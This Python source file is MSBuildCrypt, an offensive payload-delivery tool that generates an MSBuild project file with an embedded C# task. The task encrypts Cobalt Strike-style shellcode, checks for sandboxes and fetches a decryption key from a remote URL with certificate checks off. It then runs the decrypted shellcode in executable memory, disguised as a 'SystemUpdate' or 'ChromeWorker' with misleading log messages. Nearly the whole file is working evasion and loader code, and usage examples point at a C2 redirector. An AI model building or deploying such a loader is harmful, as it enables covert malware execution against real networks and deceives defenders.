#!/usr/bin/env python3
# Author: Aaron Lesmeister (Cleaned up & improved w/Claude Code)

# MSBuildCrypt : Environmental Keyed Payload Delivery with MSBuild.exe
# Protect your shellcode with AES encryption using environmental + HTTP keying.

#####

import argparse
import base64
import hashlib
import requests
import secrets
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from jinja2 import Template
import sys
import os
import time

# Jinja2 template for MSBuild C# payload
MSBUILD_TEMPLATE = """<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0">
  
  <PropertyGroup>
    <Configuration Condition="'$(Configuration)' == ''">Release</Configuration>
    <Platform Condition="'$(Platform)' == ''">x64</Platform>
    <ProjectGuid>{12345678-1234-1234-1234-123456789012}</ProjectGuid>
    <OutputType>Library</OutputType>
    <AppDesignerFolder>Properties</AppDesignerFolder>
    <RootNamespace>{{ namespace }}</RootNamespace>
    <AssemblyName>{{ assembly_name }}</AssemblyName>
    <TargetFrameworkVersion>v4.6</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
  </PropertyGroup>

  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|x64'">
    <PlatformTarget>x64</PlatformTarget>
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\\Release\\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>

  <UsingTask TaskName="{{ task_name }}" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using System.Collections.Generic;
        using System.Net;
        using System.Net.Security;
        using System.Text;
        using System.Threading;
        using System.Diagnostics;
        using System.Runtime.InteropServices;
        using System.Security.Cryptography;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;

        public class {{ task_name }} : Task
        {
            [DllImport("kernel32.dll")]
            static extern IntPtr GetCurrentProcess();
            
            [DllImport("kernel32.dll")]
            static extern IntPtr GetModuleHandle(string lpModuleName);
            
            [DllImport("kernel32.dll")]
            static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
            
            [DllImport("kernel32.dll")]
            static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

            // We need to get environment details to ensure we install the correct update in the correct location.
            private Dictionary<string, string> RetrieveEnvironmentComponents()
            {
                var enviData = new Dictionary<string, string>();
                
                try
                {
                    Thread.Sleep({{ env_delay }});
                    
                    string computerName = Environment.GetEnvironmentVariable("COMPUTERNAME");
                    if (!string.IsNullOrEmpty(computerName))
                    {
                        enviData["COMPUTERNAME"] = computerName;
                        Log.LogMessage("Retrieved system identifier.");
                    }
                    Thread.Sleep({{ env_delay }});
                    
                    string userDomain = Environment.GetEnvironmentVariable("USERDOMAIN");
                    if (!string.IsNullOrEmpty(userDomain))
                    {
                        enviData["USERDOMAIN"] = userDomain;
                        Log.LogMessage("Retrieved operating context. ");
                    }
                    Thread.Sleep({{ env_delay }});
                    
                    string processor = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
                    if (!string.IsNullOrEmpty(processor))
                    {
                        enviData["PROCESSOR_ARCHITECTURE"] = processor;
                        Log.LogMessage("Retrieved processor architecture.");
                    }
                    Thread.Sleep({{ env_delay }});
                    
                    string programFiles = Environment.GetEnvironmentVariable("PROGRAMFILES");
                    if (!string.IsNullOrEmpty(programFiles))
                    {
                        enviData["PROGRAMFILES"] = programFiles;
                        Log.LogMessage("Retrieved install path context.");
                    }
                    Thread.Sleep({{ env_delay }});
                    
                    string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
                    if (!string.IsNullOrEmpty(systemRoot))
                    {
                        enviData["SystemRoot"] = systemRoot;
                        Log.LogMessage("Retrieved system root path.");
                    }
                    
                    return enviData;
                }
                catch (Exception ex)
                {
                    Log.LogError("Environment validation failed: " + ex.Message);
                    return new Dictionary<string, string>();
                }
            }
            private bool EnvironmentalChecks()
            {
                try
                {
                    string domain = Environment.UserDomainName;
                    if (domain.Equals(Environment.MachineName, StringComparison.OrdinalIgnoreCase))
                        return false;
                    
                    var computerInfo = new Microsoft.VisualBasic.Devices.ComputerInfo();
                    if (computerInfo.TotalPhysicalMemory < 2147483648)
                        return false;
                    
                    Thread.Sleep({{ env_delay }});
                    
                    return true;
                }
                catch
                {
                    return false;
                }
            }

            private string RetrieveConfigurationKey()
            {
                try
                {
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
                    
                    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                    
                    using (var client = new WebClient())
                    {
                        client.Headers.Add("User-Agent", "{{ user_agent }}");                        
                        client.Proxy = WebRequest.DefaultWebProxy;
                        client.Proxy.Credentials = CredentialCache.DefaultCredentials;
                        
                        Log.LogMessage("Retrieving configuration product key...");
                        
                        string response = client.DownloadString("{{ key_url }}");
                        
                        if (string.IsNullOrEmpty(response))
                        {
                            Log.LogError("Configuration returned empty response");
                            return null;
                        }
                        
                        Log.LogMessage("Configuration product key retrieved successfully, processing...");
                        
                        using (SHA512 sha512 = SHA512.Create())
                        {
                            byte[] hashBytes = sha512.ComputeHash(Encoding.UTF8.GetBytes(response));
                            string hashResult = BitConverter.ToString(hashBytes).Replace("-", "").ToLower();
                            Log.LogMessage("Configuration key generated successfully");
                            return hashResult;
                        }
                    }
                }
                catch (WebException webEx)
                {
                    if (webEx.Response != null)
                    {
                        using (var reader = new System.IO.StreamReader(webEx.Response.GetResponseStream()))
                        {
                            string errorResponse = reader.ReadToEnd();
                            Log.LogError("HTTP Error: " + webEx.Status.ToString() + " - " + errorResponse);
                        }
                    }
                    else
                    {
                        Log.LogError("Network Error: " + webEx.Message);
                    }
                    return null;
                }
                catch (Exception ex)
                {
                    Log.LogError("Configuration product key retrieval failed: " + ex.Message);
                    if (ex.InnerException != null)
                    {
                        Log.LogError("Inner exception: " + ex.InnerException.Message);
                    }
                    return null;
                }
            }

            private byte[] ProcessUpdateEligibility(byte[] configData, string httpKey, Dictionary<string, string> enviData)
            {
                try
                {
                    var envValues = new List<string>();
                    foreach (var kvp in enviData)
                    {
                        if (!string.IsNullOrEmpty(kvp.Value))
                        {
                            envValues.Add(kvp.Value);
                        }
                    }
                    
                    Log.LogMessage("Processing update eligibility...");
                    
                    var allUpdateParams = new List<List<string>>();
                    
                    if (!string.IsNullOrEmpty(httpKey))
                    {
                        allUpdateParams.Add(new List<string> { httpKey });
                    }
                    
                    foreach (string envValue in envValues)
                    {
                        allUpdateParams.Add(new List<string> { envValue });
                    }
                    
                    if (!string.IsNullOrEmpty(httpKey))
                    {
                        foreach (string envValue in envValues)
                        {
                            allUpdateParams.Add(new List<string> { httpKey, envValue });
                        }
                    }
                    
                    if (!string.IsNullOrEmpty(httpKey))
                    {
                        for (int i = 0; i < envValues.Count; i++)
                        {
                            for (int j = i + 1; j < envValues.Count; j++)
                            {
                                allUpdateParams.Add(new List<string> { httpKey, envValues[i], envValues[j] });
                            }
                        }
                    }
                    
                    if (!string.IsNullOrEmpty(httpKey))
                    {
                        for (int i = 0; i < envValues.Count; i++)
                        {
                            for (int j = i + 1; j < envValues.Count; j++)
                            {
                                for (int k = j + 1; k < envValues.Count; k++)
                                {
                                    allUpdateParams.Add(new List<string> { httpKey, envValues[i], envValues[j], envValues[k] });
                                }
                            }
                        }
                    }
                    
                    foreach (var factor in allUpdateParams)
                    {
                        try
                        {
                            string km_vy = string.Join("", factor);
                            
                            byte[] aesKey;
                            using (var sha256 = SHA256.Create())
                            {
                                aesKey = sha256.ComputeHash(Encoding.UTF8.GetBytes(km_vy));
                            }
                            
                            using (var aes = new AesCryptoServiceProvider())
                            {
                                aes.Key = aesKey;
                                aes.IV = new byte[16];
                                aes.Mode = CipherMode.CBC;
                                aes.Padding = PaddingMode.PKCS7;
                                
                                using (var productUpdate = aes.CreateDecryptor())
                                {
                                    byte[] d_UpdateData = productUpdate.TransformFinalBlock(configData, 0, configData.Length);
                                    
                                    if (d_UpdateData.Length > 100 && d_UpdateData.Length < 5242880)
                                    {
                                        int nonZeroBytes = 0;
                                        for (int i = 0; i < Math.Min(50, d_UpdateData.Length); i++)
                                        {
                                            if (d_UpdateData[i] != 0x00)
                                            {
                                                nonZeroBytes++;
                                            }
                                        }
                                        
                                        if (nonZeroBytes > 15)
                                        {
                                            Log.LogMessage("Configuration validation successful");
                                            return d_UpdateData;
                                        }
                                    }
                                }
                            }
                        }
                        catch
                        {
                            continue;
                        }
                    }
                    
                    Log.LogMessage("Update eligibility process completed - no valid configuration found");
                    return new byte[0];
                }
                catch (Exception ex)
                {
                    Log.LogError("Configuration validation failed: " + ex.Message);
                    return new byte[0];
                }
            }

            public override bool Execute()
            {
                try
                {
                    if (!EnvironmentalChecks())
                    {
                        Log.LogMessage("{{ task_name }} not required for this environment.");
                        return true;
                    }

                    Log.LogMessage("Validating system environment...");
                    Dictionary<string, string> envComponents = RetrieveEnvironmentComponents();
                    
                    Log.LogMessage("Initializing configuration retrieval...");
                    Thread.Sleep({{ pre_network_delay }});

                    {% if key_url %}
                    string httpKey = RetrieveConfigurationKey();
                    if (httpKey == null)
                    {
                        Log.LogError("Failed to retrieve configuration key.");
                        return false;
                    }
                    {% else %}
                    string httpKey = null;
                    {% endif %}

                    string systemConfigData = @"{{ encrypted_payload }}";
                    
                    Log.LogMessage("Preparing configuration validation...");
                    Thread.Sleep({{ pre_decrypt_delay }});
                    
                    byte[] configBytes = Convert.FromBase64String(systemConfigData);
                    byte[] validatedConfig = ProcessUpdateEligibility(configBytes, httpKey, envComponents);
                    
                    if (validatedConfig.Length == 0)
                    {
                        Log.LogMessage("{{ task_name }} not required for this environment.");
                        return true;
                    }

                    Log.LogMessage("Finalizing configuration deployment...");
                    Thread.Sleep({{ pre_exec_delay }});

                    try
                    {
                        IntPtr exmemConfigDeploy = Marshal.AllocHGlobal(validatedConfig.Length);
                        
                        try
                        {
                            Marshal.Copy(validatedConfig, 0, exmemConfigDeploy, validatedConfig.Length);
                            
                            uint oldProtect;
                            if (VirtualProtect(exmemConfigDeploy, (UIntPtr)validatedConfig.Length, 0x40, out oldProtect))
                            {
                                if (validatedConfig.Length > 4 && exmemConfigDeploy != IntPtr.Zero)
                                {
                                    try
                                    {
                                        var processDelegate = (Action)Marshal.GetDelegateForFunctionPointer(exmemConfigDeploy, typeof(Action));
                                        processDelegate();
                                        Log.LogMessage("{{ task_name }} completed successfully.");
                                    }
                                    catch
                                    {
                                        Log.LogMessage("{{ task_name }} not required for this environment.");
                                    }
                                }
                                else
                                {
                                    Log.LogMessage("{{ task_name }} not required for this environment.");
                                }
                            }
                            else
                            {
                                Log.LogMessage("{{ task_name }} not required for this environment.");
                            }
                        }
                        finally
                        {
                            // 2019.07.16: Not ideal, but we need to free memory when an upgrade is not required as we had some system
                            //   instability observed in certain cases on Windows upgrading the software components.
                            if (exmemConfigDeploy != IntPtr.Zero)
                            {
                                Marshal.FreeHGlobal(exmemConfigDeploy);
                            }
                        }
                        
                        return true;
                    }
                    catch (Exception execEx)
                    {
                        Log.LogMessage("{{ task_name }} not required for this environment.");
                        return true;
                    }
                }
                catch (Exception ex)
                {
                    Log.LogMessage("{{ task_name }} not required for this environment.");
                    return true;
                }
            }
        }
        ]]>
      </Code>
      <Reference Include="Microsoft.VisualBasic" />
    </Task>
  </UsingTask>

  <Target Name="Build">
    <Message Text="Initializing {{ assembly_name }}..." />
    <{{ task_name }} />
    <Message Text="Build process completed." />
  </Target>

  <Target Name="Clean">
    <Message Text="Cleaning temporary files..." />
  </Target>

  <Target Name="Rebuild" DependsOnTargets="Clean;Build">
    <Message Text="Rebuild completed." />
  </Target>

</Project>"""

class HTTPKeyedEncryption:
    def __init__(self, key_url, user_agent):
        self.key_url = key_url
        self.user_agent = user_agent
        
    def retrieve_http_key(self):
        """Retrieve and hash the HTTP key resource"""
        try:
            headers = {
                'User-Agent': self.user_agent
            }
            
            response = requests.get(self.key_url, headers=headers, timeout=10)
            response.raise_for_status()
            
            # Calculate SHA512 hash of the response content
            sha512_hash = hashlib.sha512(response.text.encode('utf-8')).hexdigest()
            return sha512_hash
            
        except Exception as e:
            print(f"[-] Error retrieving HTTP key: {e}")
            return None
    
    def generate_aes_key(self, key_components):
        """Generate AES key from key components (NO static salt)"""
        # Combine all key components in sorted order for consistency
        key_material = "".join(sorted(key_components))
        
        return hashlib.sha256(key_material.encode('utf-8')).digest()
    
    def encrypt_payload(self, payload_data, static_components):
        """Encrypt payload using specified key components only"""
        key_components = []
        
        # ALWAYS get HTTP key first (since --key-url is required)
        http_key = self.retrieve_http_key()
        if not http_key:
            return None
        
        # HTTP SHA512 is ALWAYS first
        key_components.append(http_key)
        print(f"[+] HTTP SHA512: {http_key}")
        
        # Add static components after SHA512
        key_components.extend(static_components)
        
        print(f"[+] Encryption key components:")
        for i, component in enumerate(key_components):
            if i == 0:
                print(f"    [0] HTTP SHA512: {component}")
            else:
                print(f"    [{i}] Static: {component}")
        
        # Generate final key material (SHA512 FIRST, then others in order specified)
        final_key_material = "".join(key_components)
        print(f"[+] Plaintext Decryption Key: {final_key_material}")
        
        # Generate AES key 
        aes_key = hashlib.sha256(final_key_material.encode('utf-8')).digest()
        
        # Encrypt using AES-CBC with zero IV
        iv = b'\x00' * 16
        cipher = AES.new(aes_key, AES.MODE_CBC, iv)
        padded_payload = pad(payload_data, AES.block_size)
        encrypted_payload = cipher.encrypt(padded_payload)
        
        return base64.b64encode(encrypted_payload).decode('utf-8'), key_components
    
    def test_decryption(self, encrypted_b64, original_data, key_components):
        """Test decryption to verify payload integrity"""
        try:
            # Generate AES key using the same logic as encryption (no sorting)
            final_key_material = "".join(key_components)
            aes_key = hashlib.sha256(final_key_material.encode('utf-8')).digest()
            
            # Decrypt
            encrypted_data = base64.b64decode(encrypted_b64)
            iv = b'\x00' * 16
            cipher = AES.new(aes_key, AES.MODE_CBC, iv)
            decrypted_padded = cipher.decrypt(encrypted_data)
            decrypted_data = unpad(decrypted_padded, AES.block_size)
            
            return decrypted_data == original_data
            
        except Exception as e:
            print(f"[-] Test decryption error: {e}")
            return False

def fetch_and_hash_url(url, user_agent):
    """Fetch URL content and return SHA512 hash (like the C# code does)"""
    try:
        headers = {
            'User-Agent': user_agent
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        
        # Calculate SHA512 hash of the response content (matching C# behavior)
        sha512_hash = hashlib.sha512(response.text.encode('utf-8')).hexdigest()
        return response.text, sha512_hash
        
    except Exception as e:
        print(f"[-] Error fetching URL: {e}")
        return None, None

def main():
    parser = argparse.ArgumentParser(
        description='MSBuildCrypt : Environmentally Keyed Payload Delivery with MSBuild.exe',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Description: 
    Protect your shellcode with AES encryption using environmental + HTTP keying.

Requirements:
    - Generate a stageless beacon (e.g. beacon.bin) with Cobalt Strike or any other payload generation tool.
        - Use Cobalt Strike's built-in "Guardrails" for additional keying.
    - HTTP Key requires either KeyringServer+ or any web-accessible resource under your control.

Caveats:
    - Your beacon.bin needs to be less than 5MB. If it is more than 5MB, you will need to update the final
        cproj file and increase the size in the following line \"d_UpdateData.Length < 5242880\".
    - When you're testing out your payload in a controlled environment, you may need to remove the check
        to see if the target machine is domain joined. That can be found in \"private bool EnvironmentalChecks()\".
        If you leave this check in and your target machine is not domain joined, the program will immediately exit.
        I recommend matching your target env as closely as possible with Ludus.

TODO/DEV: 
    - Need to test long (2m+) delay times to see how that impacts execution, if at all.
    
Usage Examples:
  %(prog)s --binfile beacon.bin --key-url https://gist.githubusercontent.com/USER/whatever/check.txt --outfile payload.proj
  
  %(prog)s --binfile beacon.bin \\
           --key-url https://r1.c2-redirector.tld/access \\
           --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \\
           --domain-name "CLIENTDOMAIN" \\
           --namespace "GoogleChrome" \\
           --assembly-name "ChromeWorker" \\
           --task-name "UpdateTask" \\
           --env-delay 8000 \\
           --pre-network-delay 24000 \\
           --pre-decrypt-delay 60000 \\
           --pre-exec-delay 120000 \\
           --outfile BlueFalcon.proj \\
           
        '''
    )
    
    # Required arguments
    parser.add_argument('--binfile', 
                       required=True,
                       help='Input binary file (e.g., beacon.bin from Cobalt Strike)')
    
    parser.add_argument('--key-url',
                       required=True,
                       help='URL to fetch the HTTP key from (e.g., https://example.com/check)')
    
    # Optional arguments
    parser.add_argument('--outfile',
                       help='Output MSBuild project file (if not specified, prints to stdout)')
    
    parser.add_argument('--user-agent',
                       default='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                       help='User-Agent string for HTTP requests')
    
    parser.add_argument('--machine-name',
                       help='Specific machine name for key derivation (exact match required)')
    
    parser.add_argument('--domain-name',
                       help='Specific domain name for key derivation (exact match required)')
    
    # MSBuild customization
    parser.add_argument('--namespace',
                       default='SystemUpdateUtility',
                       help='C# namespace for the generated code')
    
    parser.add_argument('--assembly-name',
                       default='SystemUpdateUtility',
                       help='Assembly name for the MSBuild project')
    
    parser.add_argument('--task-name',
                       default='SystemUpdate',
                       help='Task class name in the generated C#')
    
    parser.add_argument('--env-delay',
                       type=int,
                       default=5000,
                       help='Delay in milliseconds between environment variable queries')
    
    parser.add_argument('--pre-network-delay',
                       type=int,
                       default=3000,
                       help='Delay in milliseconds before HTTP key retrieval')
    
    parser.add_argument('--pre-decrypt-delay',
                       type=int,
                       default=4000,
                       help='Delay in milliseconds before payload decryption')
    
    parser.add_argument('--pre-exec-delay',
                       type=int,
                       default=12000,
                       help='Delay in milliseconds before payload execution')
    
    # Utility flags
    parser.add_argument('--fetch-key',
                       action='store_true',
                       help='Fetch and display the SHA512 hash of the HTTP key resource (for testing)')
    
    parser.add_argument('--test',
                       action='store_true',
                       help='Run encryption/decryption test to verify payload integrity')
    
    parser.add_argument('--verbose', '-v',
                       action='store_true',
                       help='Enable verbose output')

    
    args = parser.parse_args()
    
    # Fetch and hash key URL if requested
    if args.fetch_key:
        if not args.key_url:
            print("[-] Error: --key-url required when using --fetch-key")
            sys.exit(1)
            
        print(f"[+] Fetching HTTP key from: {args.key_url}")
        print(f"[+] Using User-Agent: {args.user_agent}")
        print("-" * 60)
        
        content, sha512_hash = fetch_and_hash_url(args.key_url, args.user_agent)
        
        if content and sha512_hash:
            print("[+] HTTP Resource Content:")
            print(content)
            print("-" * 60)
            print(f"[+] SHA512 Hash: {sha512_hash}")
            print("-" * 60)
            print(f"[+] Test with curl:")
            print(f"curl -A '{args.user_agent}' {args.key_url} | sha512sum")
        else:
            print("[-] Failed to fetch HTTP key resource")
            sys.exit(1)
        return
    
    # Validate keyer combination - cannot use both machine-name and domain-name
    if args.machine_name and args.domain_name:
        print("[-] ERROR: Cannot specify both --machine-name and --domain-name in the same command.")
        print("    Valid combinations:")
        print("      --key-url <URL>")
        print("      --key-url <URL> --machine-name \"VALUE\"")
        print("      --key-url <URL> --domain-name \"VALUE\"")
        sys.exit(1)
    
    # Validate input file exists
    if not os.path.exists(args.binfile):
        print(f"[-] Error: {args.binfile} not found")
        sys.exit(1)
    
    if args.verbose:
        print("[+] HTTP-Keyed Payload Encryption")
        print(f"[+] Input file: {args.binfile}")
        print(f"[+] Key URL: {args.key_url}")
        if args.machine_name:
            print(f"[+] Static machine name: {args.machine_name}")
        if args.domain_name:
            print(f"[+] Static domain name: {args.domain_name}")
        print()
    
    # Read payload
    with open(args.binfile, 'rb') as f:
        payload_data = f.read()
    
    print(f"\n[+] Read {len(payload_data)} bytes from {args.binfile}")
    
    # Build key components list based on specified options
    key_components = []
    
    if args.machine_name:
        key_components.append(args.machine_name)
        print(f"[+] Using static machine name: {args.machine_name}")
    
    if args.domain_name:
        key_components.append(args.domain_name)
        print(f"[+] Using static domain name: {args.domain_name}")
    
    
    if not key_components:
        print("[!] WARNING: No key components specified. Payload will only be protected by HTTP key.")
        print("    Consider using --machine-name or --domain-name")
    
    # Initialize HTTP keyed encryption
    encryptor = HTTPKeyedEncryption(args.key_url, args.user_agent)
    
    # Encrypt payload
    print("[+] Retrieving HTTP key and encrypting payload...")
    result = encryptor.encrypt_payload(payload_data, key_components)
    
    if result is None:
        print("[-] Encryption failed")
        sys.exit(1)
    
    encrypted_payload, key_components_used = result
    print(f"[+] Payload encrypted successfully ({len(encrypted_payload)} base64 chars)")
    
    # Test decryption if requested
    if args.test:
        print("[+] Testing decryption...")
        if encryptor.test_decryption(encrypted_payload, payload_data, key_components_used):
            print("[+] Decryption test PASSED")
        else:
            print("[-] Decryption test FAILED")
            sys.exit(1)
    
    # Generate MSBuild project
    template = Template(MSBUILD_TEMPLATE)
    
    # Prepare template variables
    template_vars = {
        'namespace': args.namespace,
        'assembly_name': args.assembly_name,
        'task_name': args.task_name,
        'env_delay': args.env_delay,
        'pre_network_delay': args.pre_network_delay,
        'pre_decrypt_delay': args.pre_decrypt_delay,
        'pre_exec_delay': args.pre_exec_delay,
        'user_agent': args.user_agent,
        'key_url': args.key_url,
        'encrypted_payload': encrypted_payload,
        'static_machine_name': args.machine_name,
        'static_domain_name': args.domain_name,
        'key_url': args.key_url
    }
    
    if args.verbose:
        print("[+] Template variables:")
        for key, value in template_vars.items():
            if key == 'encrypted_payload':
                print(f"    {key}: {str(value)[:50]}... ({len(str(value))} chars)")
            else:
                print(f"    {key}: {value}")
        print()
    
    msbuild_content = template.render(**template_vars)
    
    # Check for any remaining template variables
    if '{{' in msbuild_content or '}}' in msbuild_content:
        print("[-] WARNING: Unresolved template variables found in output!")
        import re
        unresolved = re.findall(r'\{\{[^}]+\}\}', msbuild_content)
        for var in set(unresolved):
            print(f"    Unresolved: {var}")
        print()
    
    # Output MSBuild file
    if args.outfile:
        with open(args.outfile, 'w') as f:
            f.write(msbuild_content)
        print(f"\n[+] MSBuild project saved to {args.outfile} \n")
    else:
        print("\n[+] Generated MSBuild project:")
        print("=" * 80)
        print(msbuild_content)
        print("=" * 80)
    
    print("\n[+] Encryption Summary:")
    if 'key_components_used' in locals():
        print(f"    ✓ Encrypted with {len(key_components_used)} keyer components")
        for i, comp in enumerate(key_components_used):
            if len(comp) > 60:
                print(f"        [{i}] HTTP SHA512: {comp}")
            else:
                print(f"        [{i}] Static: {comp}")
    
    print("\n[+] Usage:")
    print(f"    MSBuild.exe payload.proj")
    
    print("\n[+] Key Management:")
    print(f"    - HTTP resource: {args.key_url}")
    print("    - To disable payload: change or delete content at HTTP resource.\n\n")

if __name__ == "__main__":
    main()
